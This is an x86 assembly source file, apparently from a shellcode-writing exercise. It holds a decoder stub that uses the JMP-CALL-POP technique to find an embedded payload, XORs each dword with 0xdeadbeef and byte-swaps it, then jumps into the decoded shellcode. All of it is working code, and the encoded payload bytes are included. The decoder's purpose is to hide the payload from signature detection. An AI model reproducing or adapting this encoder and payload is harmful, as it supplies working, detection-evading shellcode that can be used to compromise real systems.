; This code decodes the 2_5 shellcode using algorithm described in encoder.py

global _start
section .text

_start:
	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; As assumption, the first double word in our shellcode is the XOR
	; encoded payload length
	mov edx, dword [esi + eax]
	xor edx, 0xdeadbeef
	
	add al, 4
	
decode:
	mov ebx, dword [esi+eax]
	inc ecx
	cmp cl, dl
	je short EncodedShellcode

	; shellcode is stored in a reversed way. Let' XOR-it
	xor ebx, 0xdeadbeef

	; Now we have to swap again bytes before saving into memory
	bswap ebx

	mov [edi], ebx
	add edi, 4
	add al, 4
	
	jmp short decode


call_shellcode:
	call decoder
    EncodedShellcode: db 0xbf, 0xee, 0xfd, 0x8e, 0x0e, 0x49, 0x64, 0xef, 0xa9, 0x0e, 0x6e, 0x57, 0x57, 0xed, 0x2d, 0x13, 0x31, 0x13, 0x13, 0x31, 0x24, 0xd6, 0x6f, 0x57, 0x87, 0xa4, 0xb1, 0x15, 0x1c, 0x94, 0xbf, 0xea, 0x77, 0x13, 0x13, 0xb6, 0x18, 0xe6, 0xed, 0xcc, 0x84, 0xe6, 0xf5, 0x3e, 0x2f, 0xbf, 0xaf, 0x1e, 0xbf, 0xbd, 0x6d, 0x5d, 0x22, 0x75, 0xc8, 0x66, 0xec, 0x7e, 0xc6, 0xfa, 0xde, 0x5d, 0x24, 0x8e, 0x89, 0x6e, 0x5a, 0x1e, 0x89, 0x4a, 0xac, 0x66, 0x17, 0x7f, 0xcb, 0x96, 0x66, 0x6e, 0x5a, 0xd6, 0x7f, 0x3e, 0x60, 0x14
